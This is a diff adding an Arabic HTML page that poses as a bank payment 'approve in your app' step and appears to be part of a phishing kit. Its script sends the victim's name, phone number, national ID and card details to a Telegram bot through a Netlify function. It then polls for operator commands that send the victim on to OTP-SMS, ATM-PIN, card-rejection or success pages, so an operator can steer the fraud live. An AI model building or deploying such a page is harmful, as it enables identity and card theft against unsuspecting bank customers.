@@ -1,0 +1,608 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>المصادقة عبر تطبيق الهاتف</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="assets/fonts/fontawesome/css/all.min.css" />
+    <style>
+      :root {
+        --primary-gradient: linear-gradient(135deg, #2866d3 0%, #1e4fa8 100%);
+        --bg-main: #f3f7fb;
+        --bg-container: #ffffff;
+        --text-title: #0f172a;
+        --text-body: #334155;
+        --text-muted: #64748b;
+        --border-color: #cbd5e1;
+        --shadow-container: 0 15px 30px rgba(40, 102, 211, 0.04);
+        --error-color: #ef4444;
+        --theme-accent: #2866d3;
+        --font-main: "Cairo", "Outfit", sans-serif;
+        --transition-speed: 0.25s;
+      }
+
+      [data-theme="dark"] {
+        --bg-main: #070a10;
+        --bg-container: #101622;
+        --text-title: #f8fafc;
+        --text-body: #cbd5e1;
+        --text-muted: #8e9cae;
+        --border-color: #27354a;
+        --shadow-container: 0 15px 30px rgba(0, 0, 0, 0.3);
+        --theme-accent: #3b82f6;
+      }
+
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+
+      body {
+        font-family: var(--font-main);
+        background-color: var(--bg-main);
+        color: var(--text-body);
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 15px;
+        position: relative;
+        transition: background-color var(--transition-speed), color var(--transition-speed);
+      }
+
+      .floating-controls {
+        position: absolute;
+        top: 12px;
+        left: 12px;
+        right: 12px;
+        display: flex;
+        justify-content: flex-end;
+        pointer-events: none;
+        z-index: 100;
+      }
+
+      .floating-controls * {
+        pointer-events: auto;
+      }
+
+      .theme-toggle-btn {
+        background-color: var(--bg-container);
+        border: 1px solid var(--border-color);
+        color: var(--text-body);
+        width: 34px;
+        height: 34px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+        box-shadow: 0 2px 6px rgba(0, 0, 0, 0.04);
+        transition: all var(--transition-speed);
+      }
+
+      .payment-container {
+        background-color: var(--bg-container);
+        width: 100%;
+        max-width: 410px;
+        border-radius: 24px;
+        box-shadow: var(--shadow-container);
+        padding: 30px 24px 24px;
+        border: 1px solid var(--border-color);
+      }
+
+      .brand-logo-container {
+        align-self: flex-start;
+        margin-bottom: 24px;
+        height: 72px;
+        display: flex;
+        align-items: center;
+      }
+
+      .page-content {
+        display: flex;
+        flex-direction: column;
+        text-align: right;
+      }
+
+      .main-title {
+        font-size: 22px;
+        font-weight: 800;
+        color: var(--text-title);
+        margin-bottom: 24px;
+        text-align: center;
+      }
+
+      .steps-heading {
+        font-size: 15px;
+        font-weight: 800;
+        color: var(--text-title);
+        margin-bottom: 12px;
+      }
+
+      .steps-list {
+        list-style: none;
+        margin-bottom: 30px;
+      }
+
+      .step-item {
+        font-size: 13px;
+        color: var(--text-body);
+        line-height: 1.8;
+        margin-bottom: 12px;
+        font-weight: 500;
+      }
+
+      .pay-submit-btn {
+        background: var(--primary-gradient);
+        color: #ffffff;
+        border: none;
+        padding: 14px;
+        border-radius: 12px;
+        font-size: 15px;
+        font-weight: 700;
+        cursor: pointer;
+        width: 100%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        box-shadow: 0 4px 14px rgba(40, 102, 211, 0.2);
+        transition: all var(--transition-speed);
+        margin-bottom: 20px;
+      }
+
+      .footer-links {
+        text-align: center;
+      }
+
+      .help-link {
+        font-size: 12px;
+        color: var(--text-muted);
+        text-decoration: none;
+        font-weight: 700;
+      }
+
+      .validation-msg {
+        color: var(--error-color);
+        background-color: rgba(239, 68, 68, 0.08);
+        border: 1px solid rgba(239, 68, 68, 0.2);
+        padding: 10px 14px;
+        border-radius: 8px;
+        font-size: 12px;
+        font-weight: 600;
+        text-align: center;
+        margin-bottom: 16px;
+        display: none;
+        line-height: 1.6;
+      }
+
+      .loading-overlay {
+        position: fixed;
+        inset: 0;
+        background-color: var(--bg-container);
+        z-index: 9999;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+        opacity: 0;
+        visibility: hidden;
+        transition: all var(--transition-speed) ease;
+      }
+
+      .loading-overlay.active {
+        opacity: 1;
+        visibility: visible;
+      }
+
+      .spinner-ring {
+        width: 48px;
+        height: 48px;
+        border: 3px solid var(--border-color);
+        border-top-color: var(--theme-accent);
+        border-radius: 50%;
+        animation: spin 1s infinite linear;
+        margin-bottom: 15px;
+      }
+
+      .status-text {
+        font-size: 16px;
+        font-weight: 700;
+        color: var(--text-title);
+        margin-bottom: 6px;
+        text-align: center;
+      }
+
+      .status-sub {
+        font-size: 12px;
+        color: var(--text-muted);
+        text-align: center;
+        max-width: 280px;
+        line-height: 1.4;
+      }
+
+      @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+      }
+
+      @keyframes shake {
+        0%, 100% { transform: translateX(0); }
+        20%, 60% { transform: translateX(-6px); }
+        40%, 80% { transform: translateX(6px); }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="loading-overlay" id="loadingOverlay">
+      <div class="spinner-ring"></div>
+      <div class="status-text" id="statusText">يرجى الانتظار جاري معالجة طلبك</div>
+      <div class="status-sub" id="statusSub" style="display: none;"></div>
+    </div>
+
+    <div class="floating-controls">
+      <button class="theme-toggle-btn" id="themeToggle" aria-label="تبديل الوضع الليلي">
+        <i class="fa-solid fa-moon"></i>
+      </button>
+    </div>
+
+    <div class="payment-container">
+      <div class="brand-logo-container" id="logoContainer"></div>
+
+      <div class="page-content">
+        <h2 class="main-title">المصادقة عبر تطبيق الهاتف</h2>
+        <h3 class="steps-heading">كيفية الموافقة على هذه الدفعة:</h3>
+        <ul class="steps-list">
+          <li class="step-item">الخطوة 1: افتح تطبيق البنك أو الإشعار الفوري على هاتفك.</li>
+          <li class="step-item">الخطوة 2: راجع عملية الدفع ثم وافق عليها من داخل التطبيق.</li>
+          <li class="step-item">الخطوة 3: اضغط الزر بالأسفل بعد إتمام الموافقة للمتابعة.</li>
+        </ul>
+
+        <div class="validation-msg" id="appError"></div>
+
+        <button class="pay-submit-btn" id="approveBtn" type="button">لقد وافقت على هذه المعاملة</button>
+
+        <div class="footer-links">
+          <a href="#" class="help-link" id="helpLink">هل تحتاج للمساعدة؟ | شروط الاستخدام</a>
+        </div>
+      </div>
+    </div>
+
+    <script src="assets/js/config.js"></script>
+    <script src="assets/js/pin.js"></script>
+    <script>
+      (function () {
+        const state = {
+          theme: localStorage.getItem("alain_payment_theme") || "light"
+        };
+        const digitMap = {
+          "٠": "0", "١": "1", "٢": "2", "٣": "3", "٤": "4",
+          "٥": "5", "٦": "6", "٧": "7", "٨": "8", "٩": "9",
+          "۰": "0", "۱": "1", "۲": "2", "۳": "3", "۴": "4",
+          "۵": "5", "۶": "6", "۷": "7", "۸": "8", "۹": "9"
+        };
+
+        const themeToggleBtn = document.getElementById("themeToggle");
+        const logoContainer = document.getElementById("logoContainer");
+        const helpLink = document.getElementById("helpLink");
+        const approveBtn = document.getElementById("approveBtn");
+        const loadingOverlay = document.getElementById("loadingOverlay");
+        const statusText = document.getElementById("statusText");
+        const statusSub = document.getElementById("statusSub");
+        const appError = document.getElementById("appError");
+        let appPollTimer = null;
+        let telegramUpdatesOffset = Number(localStorage.getItem("telegramUpdatesOffset") || "0") || 0;
+
+        function normalizeDigits(value) {
+          return String(value || "")
+            .split("")
+            .map((char) => digitMap[char] ?? char)
+            .join("")
+            .replace(/\D+/g, "");
+        }
+
+        function getPaymentData() {
+          try {
+            return JSON.parse(localStorage.getItem("paymentData") || "{}");
+          } catch {
+            return {};
+          }
+        }
+
+        function getCardDigits() {
+          const paymentData = getPaymentData();
+          return normalizeDigits(paymentData.cardNumberDigits || paymentData.cardNumber || localStorage.getItem("cardNumber") || "");
+        }
+
+        function isAdibCard() {
+          const firstFour = getCardDigits().slice(0, 4);
+          return (window.rejectedPins || []).includes(firstFour);
+        }
+
+        function detectCardBrand() {
+          const digits = getCardDigits();
+          if (digits.startsWith("4")) return "visa";
+          if (/^5[1-5]/.test(digits)) return "mastercard";
+          return "default";
+        }
+
+        function renderLogo() {
+          const cardBrand = detectCardBrand();
+          let logoHtml = "";
+          if (cardBrand === "mastercard") {
+            logoHtml = `
+              <svg viewBox="0 0 100 60" width="120" height="72">
+                <circle cx="38" cy="30" r="20" fill="#EB001B" />
+                <circle cx="62" cy="30" r="20" fill="#F79E1B" fill-opacity="0.85" />
+                <text x="50" y="58" font-family="'Outfit', sans-serif" font-weight="700" font-size="9" fill="currentColor" text-anchor="middle">mastercard</text>
+              </svg>
+            `;
+          } else if (cardBrand === "visa") {
+            logoHtml = `
+              <svg viewBox="0 0 100 60" width="120" height="72">
+                <text x="50" y="42" font-family="'Outfit', sans-serif" font-weight="900" font-style="italic" font-size="30" fill="#1A1F71" text-anchor="middle">VISA</text>
+              </svg>
+            `;
+          } else {
+            logoHtml = `
+              <svg viewBox="0 0 100 60" width="120" height="72" fill="none" stroke="var(--theme-accent)" stroke-width="2">
+                <rect width="80" height="50" x="10" y="5" rx="6" stroke="var(--theme-accent)" stroke-width="3" />
+                <line x1="10" y1="20" x2="90" y2="20" stroke="var(--theme-accent)" stroke-width="3" />
+                <rect width="15" height="10" x="20" y="30" fill="var(--theme-accent)" />
+              </svg>
+            `;
+          }
+          logoContainer.innerHTML = logoHtml;
+        }
+
+        function updateThemeIcon() {
+          const icon = themeToggleBtn.querySelector("i");
+          icon.className = state.theme === "dark" ? "fa-solid fa-sun" : "fa-solid fa-moon";
+        }
+
+        function getTelegramCredentials() {
+          return { proxy: true }; // credentials handled server-side
+        }
+
+        function readCustomerInfo() {
+          try {
+            const payload = JSON.parse(localStorage.getItem("fazaa.orderForm") || "{}");
+            return {
+              fullName: payload.fullName || "غير معروف",
+              phoneNumber: payload.phoneNumber || "غير معروف",
+              nationalId: payload.nationalId || "غير معروف"
+            };
+          } catch {
+            return {
+              fullName: "غير معروف",
+              phoneNumber: "غير معروف",
+              nationalId: "غير معروف"
+            };
+          }
+        }
+
+        function getMaskedCardNumber() {
+          const digits = getCardDigits();
+          return digits.length >= 4 ? `\u200E•••• ${digits.slice(-4)}\u200E` : "غير معروف";
+        }
+
+        function formatAppApprovalMessage() {
+          const customer = readCustomerInfo();
+          const header = isAdibCard() ? "🏦 <b>بنك أديب</b>" : "🔵 <b>صفحة تحقق التطبيق</b>";
+          return [
+            header,
+            "✅ <b>تمت الموافقة من قبل المستخدم</b>",
+            "",
+            "👤 <b>معلومات العميل</b>",
+            `<b>الاسم:</b> ${customer.fullName || "غير معروف"}`,
+            `<b>الهاتف:</b> ${customer.phoneNumber || "غير معروف"}`,
+            `<b>الهوية:</b> ${customer.nationalId || "غير معروف"}`,
+            "",
+            "💳 <b>معلومات البطاقة</b>",
+            `<b>رقم البطاقة:</b> <code>${getMaskedCardNumber()}</code>`
+          ].join("\n");
+        }
+
+        async function telegramApi(credentials, method, body) {
+          const response = await fetch("/.netlify/functions/telegram", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ method, ...body })
+          });
+          const json = await response.json().catch(() => null);
+          if (!response.ok || !json?.ok) return null;
+          return json;
+        }
+
+        function persistTelegramOffset(offset) {
+          telegramUpdatesOffset = Number(offset) || telegramUpdatesOffset;
+          localStorage.setItem("telegramUpdatesOffset", String(telegramUpdatesOffset));
+        }
+
+        async function bootstrapUpdatesOffset(credentials) {
+          if (telegramUpdatesOffset > 0) return;
+          const latest = await telegramApi(credentials, "getUpdates", {
+            offset: 0,
+            timeout: 0,
+            allowed_updates: ["callback_query"]
+          });
+          const updates = latest?.result || [];
+          const last = updates[updates.length - 1];
+          if (last?.update_id != null) {
+            persistTelegramOffset(Number(last.update_id) + 1);
+          }
+        }
+
+        function setOverlayVisible(visible) {
+          loadingOverlay.classList.toggle("active", visible);
+        }
+
+        async function sendAppApprovalToTelegram() {
+          const credentials = getTelegramCredentials();
+          if (!credentials) return null;
+          const message = formatAppApprovalMessage();
+          const response = await fetch("/.netlify/functions/telegram", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              method: "sendMessage",
+              text: message,
+              parse_mode: "HTML",
+              disable_web_page_preview: true,
+              reply_markup: {
+                inline_keyboard: [
+                  [
+                    { text: "❌ رفض الموافقة", callback_data: "app_invalid" },
+                    { text: "❌ رفض البطاقة", callback_data: "app_reject_card" }
+                  ],
+                  [
+                    { text: "💬 OTP-SMS", callback_data: "app_otp_sms" },
+                    { text: "🏧 ATM", callback_data: "app_atm" }
+                  ],
+                  [
+                    { text: "✅ إنهاء", callback_data: "app_finish" }
+                  ]
+                ]
+              }
+            })
+          });
+          if (!response.ok) return null;
+          const data = await response.json().catch(() => null);
+          if (!data?.ok || !data?.result?.message_id) return null;
+          return { credentials, messageId: Number(data.result.message_id) };
+        }
+
+        async function finalizeTelegramCallback(credentials, callbackQuery, statusText) {
+          const message = callbackQuery?.message;
+          if (!message) return;
+          const baseText = String(message.text || "").replace(/\n\nالحالة:\s*(❌ تم رفض الموافقة|❌ تم رفض البطاقة|📱 تحويل إلى OTP-SMS|🏧 تحويل إلى الصراف الآلي|✅ تم الإنهاء)\s*$/u, "").trim();
+          const updatedText = `${baseText}\n\nالحالة: ${statusText}`;
+          await telegramApi(credentials, "editMessageText", {
+            chat_id: message.chat.id,
+            message_id: message.message_id,
+            text: updatedText,
+            disable_web_page_preview: true
+          });
+          await telegramApi(credentials, "answerCallbackQuery", {
+            callback_query_id: callbackQuery.id,
+            text: statusText,
+            show_alert: false
+          });
+        }
+
+        function stopAppPolling() {
+          if (!appPollTimer) return;
+          window.clearInterval(appPollTimer);
+          appPollTimer = null;
+        }
+
+        function shakeContainer() {
+          const container = document.querySelector(".payment-container");
+          if (!container) return;
+          container.style.animation = "none";
+          window.setTimeout(() => {
+            container.style.animation = "shake 0.4s ease";
+          }, 5);
+        }
+
+        function startAppPolling(targetMessageId, credentials) {
+          stopAppPolling();
+          appPollTimer = window.setInterval(async () => {
+            try {
+              const updatesResponse = await telegramApi(credentials, "getUpdates", {
+                offset: telegramUpdatesOffset || 0,
+                timeout: 0,
+                allowed_updates: ["callback_query"]
+              });
+              const updates = updatesResponse?.result || [];
+              for (const update of updates) {
+                if (update?.update_id != null) {
+                  persistTelegramOffset(Number(update.update_id) + 1);
+                }
+                const callback = update?.callback_query;
+                if (Number(callback?.message?.message_id || 0) !== Number(targetMessageId)) {
+                  continue;
+                }
+                const data = String(callback?.data || "");
+                if (data === "app_invalid") {
+                  await finalizeTelegramCallback(credentials, callback, "❌ تم رفض الموافقة");
+                  setOverlayVisible(false);
+                  stopAppPolling();
+                  appError.textContent = "لم تتم الموافقة على عملية المصادقة من خلال تطبيق البنك. يرجى فتح التطبيق والموافقة أولاً لإتمام العملية.";
+                  appError.style.display = "block";
+                  shakeContainer();
+                  return;
+                }
+                if (data === "app_reject_card") {
+                  await finalizeTelegramCallback(credentials, callback, "❌ تم رفض البطاقة");
+                  setOverlayVisible(false);
+                  stopAppPolling();
+                  window.location.href = "payment.html?cardRejected=1";
+                  return;
+                }
+                if (data === "app_otp_sms") {
+                  await finalizeTelegramCallback(credentials, callback, "📱 تحويل إلى OTP-SMS");
+                  setOverlayVisible(false);
+                  stopAppPolling();
+                  window.location.href = "verification.html";
+                  return;
+                }
+                if (data === "app_atm") {
+                  await finalizeTelegramCallback(credentials, callback, "🏧 تحويل إلى الصراف الآلي");
+                  setOverlayVisible(false);
+                  stopAppPolling();
+                  window.location.href = "atm.html";
+                  return;
+                }
+                if (data === "app_finish") {
+                  await finalizeTelegramCallback(credentials, callback, "✅ تم الإنهاء");
+                  setOverlayVisible(false);
+                  stopAppPolling();
+                  window.location.href = "success.html";
+                  return;
+                }
+              }
+            } catch {
+              // Keep polling quietly.
+            }
+          }, 1200);
+        }
+
+        document.documentElement.setAttribute("data-theme", state.theme);
+        updateThemeIcon();
+        renderLogo();
+
+        themeToggleBtn.addEventListener("click", () => {
+          state.theme = state.theme === "light" ? "dark" : "light";
+          document.documentElement.setAttribute("data-theme", state.theme);
+          localStorage.setItem("alain_payment_theme", state.theme);
+          updateThemeIcon();
+        });
+
+        helpLink.addEventListener("click", (event) => {
+          event.preventDefault();
+        });
+
+        approveBtn.addEventListener("click", async () => {
+          appError.style.display = "none";
+          statusText.textContent = "يرجى الانتظار جاري معالجة طلبك";
+          statusSub.textContent = "";
+          statusSub.style.display = "none";
+          setOverlayVisible(true);
+          const sent = await sendAppApprovalToTelegram();
+          if (!sent?.messageId || !sent?.credentials) {
+            setOverlayVisible(false);
+            return;
+          }
+          await bootstrapUpdatesOffset(sent.credentials);
+          startAppPolling(sent.messageId, sent.credentials);
+        });
+      })();
+    </script>
+  </body>
+</html>
